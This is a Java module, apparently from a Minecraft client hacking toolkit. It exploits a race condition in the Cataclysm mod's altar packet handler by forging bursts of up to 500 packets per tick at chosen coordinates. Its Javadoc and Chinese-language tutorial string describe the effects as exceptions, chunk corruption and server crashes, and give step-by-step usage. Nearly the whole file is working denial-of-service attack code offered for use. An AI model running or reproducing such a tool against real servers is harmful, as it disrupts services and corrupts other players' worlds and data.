package com.redblue.red.modules.cataclysm;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * CATA-02: Altar Race Condition DoS (VULN-01 + VULN-02).
 *
 * MessageUpdateblockentity handler runs directly on Netty I/O thread
 * (no enqueueWork). Concurrent packet spam causes:
 *   - Race conditions on BlockEntity state
 *   - ConcurrentModificationException on NonNullList
 *   - Potential chunk/world corruption
 *
 * Wire format (index 1):
 *   writeByte(1) + writeLong(blockPos) + writeItemStack(heldStack)
 *
 * We send rapid packets with varying ItemStacks to maximize
 * concurrent access conflicts on the altar's inventory.
 */
public class CATA02_AltarRaceDoS implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("cataclysm", "main_channel");
    private static final int IDX_UPDATE_BLOCK_ENTITY = 1;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger",
                "⚠ 确认：可能导致服务器崩溃或区块损坏", false),
        ConfigParam.ofInt("target_x", "祭坛 X", 0, -30000000, 30000000)
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofInt("target_y", "祭坛 Y", 64, -64, 320)
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofInt("target_z", "祭坛 Z", 0, -30000000, 30000000)
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofInt("packets_per_tick", "每Tick发包数",
                50, 1, 500)
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofInt("interval", "Tick间隔", 1, 1, 20)
                .visibleWhen("confirm_danger", "true")
    );

    private long lastTickTime = 0;

    @Override public String id() { return "cata02_altarracedos"; }
    @Override public String name() { return "祭坛竞态DoS"; }

    @Override
    public String description() {
        return "利用Handler未排队主线程的竞态条件，并发写入祭坛导致崩溃";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 勾选「⚠ 确认」开关\n"
            + "2. 输入目标祭坛坐标\n"
            + "3. 设置发包参数后点击「执行」或启用自动循环\n\n"
            + "[原理]\n"
            + "MessageUpdateblockentity Handler 未调用 enqueueWork()，\n"
            + "直接在 Netty I/O 线程执行 BlockEntity 操作。\n"
            + "并发发送大量包会导致多个 I/O 线程同时读写\n"
            + "祭坛的 NonNullList，触发竞态条件。\n\n"
            + "[可能效果]\n"
            + "- ConcurrentModificationException\n"
            + "- 区块数据损坏\n"
            + "- 服务器崩溃";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("cataclysm");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        if (!isConfirmed()) return;

        int count = getParam("packets_per_tick")
                .map(ConfigParam::getInt).orElse(50);
        sendBurst(count);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!isConfirmed()) return;

        int interval = getParam("interval")
                .map(ConfigParam::getInt).orElse(1);
        long now = mc.level.getGameTime();
        if (now - lastTickTime < interval) return;
        lastTickTime = now;

        int count = getParam("packets_per_tick")
                .map(ConfigParam::getInt).orElse(50);
        sendBurst(count);
    }

    private boolean isConfirmed() {
        return getParam("confirm_danger")
                .map(ConfigParam::getBool).orElse(false);
    }

    private void sendBurst(int count) {
        int x = getParam("target_x").map(ConfigParam::getInt).orElse(0);
        int y = getParam("target_y").map(ConfigParam::getInt).orElse(64);
        int z = getParam("target_z").map(ConfigParam::getInt).orElse(0);
        long packedPos = new BlockPos(x, y, z).asLong();

        // Pre-build two stacks to alternate, maximizing concurrent conflicts
        ItemStack stoneStack = new ItemStack(Items.STONE);
        ItemStack emptyStack = ItemStack.EMPTY;

        for (int i = 0; i < count; i++) {
            ItemStack stack = (i % 2 == 0) ? emptyStack : stoneStack;
            PacketForge.send(CHANNEL, buf -> {
                buf.writeByte(IDX_UPDATE_BLOCK_ENTITY);
                buf.writeLong(packedPos);
                buf.writeItemStack(stack, false); // m_130055_
            });
        }
    }
}
